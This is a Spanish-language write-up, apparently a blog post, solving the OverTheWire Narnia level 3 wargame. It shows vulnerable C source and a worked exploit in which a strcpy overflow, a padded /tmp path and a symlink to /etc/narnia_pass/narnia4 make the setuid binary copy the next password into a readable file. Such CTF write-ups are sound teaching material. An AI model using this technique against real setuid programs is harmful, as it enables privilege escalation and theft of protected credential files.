---
layout: default
---

## OvertheWire: Narnia3
`8-4-2021 1:00AM`

Hola a todos!

Para el tercer desafío, las cosas comienzan a mejorar, todo es un poco más complejo. No en la forma en que los conceptos son más complejos, pero se requiere un poco de pensamiento innovador para que la vulnerabilidad funcione a su favor.

### Empezando

Para el tercer desafío, las cosas comienzan a mejorar, todo es un poco más complejo. No en la forma en que los conceptos son más complejos, pero se requiere un poco de pensamiento innovador para que la vulnerabilidad funcione a su favor.

Comenzamos con el siguiente código fuente:

Tenemos el código fuente del binario:

```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){

    int  ifd,  ofd;
    char ofile[16] = "/dev/null"; /*Sets the output file to /dev/null (var size is 16 bytes)*/
    char ifile[32]; /*Sets the variable size to 32 bytes*/
    char buf[32]; /*Sets the buffer size to 32 bytes*/

    if(argc != 2){ /*Print usage*/
        printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
        exit(-1);
    }

    /* open files */
    strcpy(ifile, argv[1]); /*Copies arg to ifile var (this is vulnerable)*/
    if((ofd = open(ofile,O_RDWR)) < 0 ){
        printf("error opening %s\n", ofile); /*Error handler*/
        exit(-1);
    }
    if((ifd = open(ifile, O_RDONLY)) < 0 ){
        printf("error opening %s\n", ifile); /*Error handler*/
        exit(-1);
    }

    /* copy from file1 to file2 */
    read(ifd, buf, sizeof(buf)-1); /*Read content of In File*/
    write(ofd,buf, sizeof(buf)-1); /*Write content to Out File*/
    printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);

    /* close 'em */
    close(ifd); /*Close both*/
    close(ofd);

    exit(1);
}
```

Entonces, el concepto básico es que podemos sobrescribir el archivo de salida para que sea algo que podamos leer, y controlamos el archivo de entrada, el resto es bastante simple.

A continuación, se muestra un ejemplo del uso de binarios:

```
narnia3@narnia:/narnia$ touch /tmp/LetsPlay
narnia3@narnia:/narnia$ ./narnia3 /tmp/LetsPlay
copied contents of /tmp/LetsPlay to a safer place... (/dev/null)
```

Nos movemos al directorio /tmp ya que controlamos todo dentro de él, ahora necesitamos poder comenzar a jugar con el archivo de entrada, sabemos que el buffer de entrada es de 32 bytes y el archivo de salida es de 16 bytes, por lo que técnicamente podríamos hacer algo como `/tmp/"z"*27(32-len ('/ tmp /'))`, y luego el archivo en el que queremos escribir, digamos que el archivo de salida es /tmp/outforchiv.

Cuando desborda la variable de entrada, también sobrescribe el byte nulo que define dónde termina la cadena de esa variable, mientras que la ubicación de la memoria donde comienza el archivo de salida var sigue siendo la misma, podemos abusar de esto y hacer que el archivo sea algo como /tmp/27bytes/tmp/file, y luego enlaza simbólicamente la contraseña de narnia4 a /tmp/27bytes/tmp/file, pero también crea un archivo llamado /tmp/file con 777 permisos.

Cuando alimentamos el binario con esta ruta, desbordará el buffer, sobrescribirá el byte de terminación, por lo que el archivo de entrada se toma como /tmp/27bytes/tmp/file, pero el archivo de salida es solo /tmp/file.

Pongamos a prueba esta teoría:

```
narnia3@narnia:/tmp/zzzzzzzzzzzzzzzzzzzzzzzzzzz/tmp$ ln -s /etc/narnia_pass/narnia4 outforchiv
narnia3@narnia:/tmp/zzzzzzzzzzzzzzzzzzzzzzzzzzz/tmp$ touch /tmp/outforchiv
narnia3@narnia:/tmp/zzzzzzzzzzzzzzzzzzzzzzzzzzz/tmp$ chmod 777 /tmp/outforchiv
narnia3@narnia:/tmp/zzzzzzzzzzzzzzzzzzzzzzzzzzz/tmp$ /narnia/narnia3 $(pwd)/outforchiv
copied contents of /tmp/zzzzzzzzzzzzzzzzzzzzzzzzzzz/tmp/outforchiv to a safer place... (/tmp/outforchiv)
narnia3@narnia:/tmp/zzzzzzzzzzzzzzzzzzzzzzzzzzz/tmp$
```

¡Ahora podemos capturar el archivo /tmp/outforchiv y leer la contraseña!
